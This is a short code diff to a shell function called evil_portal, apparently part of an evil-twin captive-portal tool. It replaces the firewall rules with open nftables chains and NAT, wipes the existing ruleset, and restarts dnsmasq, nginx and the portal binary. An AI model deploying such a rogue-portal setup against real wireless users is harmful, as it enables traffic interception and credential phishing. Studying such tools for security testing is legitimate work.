@@ -92,21 +92,23 @@ function evil_portal() {
 
     echo 1 > /proc/sys/net/ipv4/ip_forward
 
-    # nft add table inet filter
-    # nft add chain inet filter input { type filter hook input priority 0 \; policy accept \; }
-    # nft add rule inet filter input iif "$AP_NIC" ct state established,related accept
-    # nft add rule inet filter input iif "$AP_NIC" ip protocol udp udp dport 53 accept
-    # nft add rule inet filter input iif "$AP_NIC" ip protocol udp udp dport 67 accept
-    # nft add rule inet filter input iif "$AP_NIC" ip protocol tcp tcp dport 80 accept
-    # nft add rule inet filter input iif "$AP_NIC" reject
+    nft flush ruleset
+
+    nft add table ip filter
+    nft add chain ip filter input  '{ type filter hook input priority 0; policy accept; }'
+    nft add chain ip filter forward '{ type filter hook forward priority 0; policy accept; }'
+    nft add chain ip filter output '{ type filter hook output priority 0; policy accept; }'
+
+    # Set up NAT for outbound traffic:
+    nft add table ip nat
+    nft add chain ip nat postrouting '{ type nat hook postrouting priority 100; }'
 
     kill -9 $(pidof dnsmasq)
-    dnsmasq -C /etc/dnsmasq.conf -d 2>&1 > $LOG_F &
-
     kill -9 $(pidof nginx)
-    nginx &
-
     kill -9 $(pidof evil_portal)
+
+    dnsmasq -C /etc/dnsmasq.conf -d 2>&1 > $LOG_F &
+    nginx &
     /usr/bin/evil_portal &
 }
 
